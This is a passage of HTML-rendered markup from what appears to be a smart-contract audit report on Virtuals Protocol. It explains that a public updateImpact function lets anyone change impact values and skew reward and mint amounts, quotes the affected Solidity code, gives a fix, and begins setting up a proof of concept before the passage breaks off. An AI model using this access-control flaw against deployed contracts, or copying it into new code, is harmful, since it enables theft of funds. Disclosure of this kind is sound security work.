class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eservices\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eservices\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNftContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);           \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Uses getImpact\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk15\"\u003econtinue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eServiceReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_serviceRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardImpacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNftContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetCore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)] += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . . \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eThe \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/token/Minter.sol#L134\"\u003e\u003ccode\u003eMinter::mint\u003c/code\u003e\u003c/a\u003e uses the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L120\"\u003e\u003ccode\u003eServiceNft::getImpact\u003c/code\u003e\u003c/a\u003e call to transfer tokens; hence, leading to excess or lower funds being transferred.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enftId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enoReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalImpactMultiplier\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_getImpactMultiplier\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econtribution\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetDatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enftId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIServiceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enftId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);          \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Uses getImpact\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emaxImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emaxImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalImpactMultiplier\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ** \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDENOM\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edataAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            ? (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIServiceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalImpactMultiplier\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ** \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDENOM\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            : \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact\" style=\"position:relative;\"\u003e\u003ca href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003ePublic \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L90\"\u003e\u003ccode\u003eServiceNft::updateImpact\u003c/code\u003e\u003c/a\u003e function allows changing impacts to anyone.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCascading issue leads loss of funds via:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eHigher / Lower rewards according to the \u003ccode\u003edatasetImpactWeight\u003c/code\u003e increase or decrease.\u003c/li\u003e\n\u003cli\u003eHigher / Lower mints as per the \u003ccode\u003edatasetImpactWeight\u003c/code\u003e change.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eIt is highly contextual as per what the protocol intends to do, it is suggested to not keep \u003ccode\u003eupdateImpact\u003c/code\u003e as a public function as it would be unfair for other users:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e-    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eupdateImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e+    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eupdateImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"proof-of-concept-1\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eThe test case below was ran using a base mainnet fork, please add the same to the \u003ccode\u003ehardhat.config.js\u003c/code\u003e file.\u003c/p\u003e\n\u003cp\u003eThe hardhat version wasn’t supporting the base mainnet fork, so it had to be upgraded:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"11\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u0026quot;hardhat\u0026quot;: \u0026quot;^2.23.0\u0026quot;,\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAdd the following values to the \u003ccode\u003e.env\u003c/code\u003e file (along with private keys:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"12\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Genesis DAO settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eGENESIS_VOTING_DELAY=0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eGENESIS_VOTING_PERIOD=900\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eGENESIS_PROPOSAL_THRESHOLD=0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Virtual DAO settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_VOTING_DELAY=0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_VOTING_PERIOD=900\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_PROPOSAL_THRESHOLD=1000000000000000000000000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ePROTOCOL_QUORUM_NUMERATOR=1000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### Other settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eCHAIN_ID=84532\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eVIRTUAL_APPLICATION_THRESHOLD=50000000000000000000 # 50\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eVIRTUAL_APPLICATION_THRESHOLD_VIP=125000000000000000000 #125 $V\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eMATURITY_DURATION=1000 # number of blocks until initial virtual staker can withdraw (1000 blocks = ~33 minutes)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e### AgentToken settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_SUPPLY=1000000000 # 1B supply\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LIMIT_TRX=100000 # 100k max token per txn\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LIMIT_WALLET=1000000 # 1M token per wallet\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAGENT_TOKEN_LP_SUPPLY=1000000000 # 1B LP tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan 